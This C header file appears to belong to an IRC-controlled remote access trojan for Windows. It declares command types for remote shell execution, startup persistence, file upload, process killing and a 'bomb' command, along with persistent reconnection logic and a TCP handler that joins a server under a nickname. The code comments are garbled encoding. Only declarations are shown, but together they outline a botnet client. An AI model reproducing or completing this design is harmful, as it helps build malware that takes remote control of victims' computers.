
#ifndef HEADER
#define HEADER


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>       // Socket connection
#include <windows.h>        // WinAPI calls
#include <ws2tcpip.h>       // TCP-IP Sockets
#include <stdio.h>
#include <string.h>

#include <wincrypt.h>
#include <malloc.h>

#pragma comment(lib, "Ws2_32.lib")

// Constants
#define DEFAULT_BUFLEN 4096
#define MAX_SEND_LENGTH 400  // ����ͳ��ȣ��ӽ���������IRC���ƣ�
#define SEND_INTERVAL 500    // ���ͼ�������룩
#define MAX_RECONNECT_ATTEMPTS 999
#define RECONNECT_INTERVAL 5000 // ��λ������
#define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1Сʱ


typedef enum
{
    CMD_UNKNOWN,
    CMD_EXECUTE,
    CMD_GETHOSTNAME,
    CMD_GETUPTIME,
    CMD_SETSTARTUP,
    CMD_FILE_UPLOAD,
    CMD_KILL_PROCESS,
    CMD_BOMB,
    CMD_LS,
    CMD_RUN,
    CMD_PWD,
    CMD_CD,
    CMD_CAT,
}CommandType;
typedef struct
{
    CommandType type;
    char* params[10]; // ���֧�� 10 ������
    int num_params;
} ParsedCommand;

// ��Ϣ�������ṹ
typedef struct {
    char buffer[DEFAULT_BUFLEN];  // ��Ϣ������
    size_t length;                // ��ǰ����������
    char target[128];             // Ŀ�������
    time_t lastSendTime;          // �ϴη���ʱ��
} MessageBuffer;




//function.cpp
BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);
int handle_file_upload(ParsedCommand cmd);
int run_executable(const char* path);
char* list_directory(const char* path);
char* pwd_command();
char* cd_command(const char* path);
char* cat_file(const char* path);

char* ExecuteCommand(const char* command);
void set_startup(const char* program_path, int enable);


//read_command.cpp
ParsedCommand parsecommand(char* raw_command);
char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock);

//network.cpp
SOCKET TCPhandler(const char* server, const char* baseNick);


//message.c


void flushBuffer(MessageBuffer* mb, SOCKET sock);
void initMessageBuffer(MessageBuffer* mb, const char* target);
void appendToBuffer(MessageBuffer* mb, SOCKET sock, const char* message);

  
#endif